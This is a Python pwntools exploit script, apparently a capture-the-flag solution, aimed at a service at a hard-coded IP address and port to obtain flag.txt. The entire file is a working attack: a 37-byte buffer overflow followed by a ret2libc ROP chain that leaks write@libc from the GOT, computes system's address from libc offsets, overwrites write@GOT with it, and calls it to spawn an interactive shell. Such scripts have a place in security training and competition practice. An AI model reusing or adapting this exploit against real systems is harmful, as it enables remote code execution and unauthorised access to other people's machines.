#!/usr/bin/python3


from pwn import *

# target: flag.txt @ 147.182.223.56:6666

def main():
    p = remote("147.182.223.56", 6666)

    write_plt = 0x080490b0
    write_got = 0x0804c018
    read_plt = 0x08049080
    pop_pop_pop_ret = 0x080492b1
    ed_string = 0x80482c5


    #libc offsets
    offset_system = 0x045960
    offset_read = 0x0f5700
    offset_write = 0x0f57c0


    # create your payload
    payload = b"A" * 37

    payload += p32(write_plt)
    payload += p32(pop_pop_pop_ret)
    payload += p32(1)
    payload += p32(write_got)
    payload += p32(4)

    payload += p32(read_plt)
    payload += p32(pop_pop_pop_ret)
    payload += p32(0)
    payload += p32(write_got)
    payload += p32(4)

    #Stage 4: execute command and get shell
    payload += p32(write_plt) #call write() --> call system()
    payload += p32(0xdeadbeef)
    payload += p32(ed_string)
    p.send(payload)

    #Stage 1: leak write@libc
    p.recv(25)
    data = p.recv(4)
    write_libc = u32(data)
    log.info("Leaked write@libc addr: 0x%x", write_libc)

    #Stage 2: find system@libc
    libc_start_addr = write_libc - offset_write
    system_libc = libc_start_addr + offset_system
    log.info("system@libc addr: 0x%x", system_libc)

    #Stage 3: send system@libc to overwrite write@got
    p.send(p32(system_libc))



    # Change to interactive mode
    p.interactive()


if __name__ == "__main__":
    main()
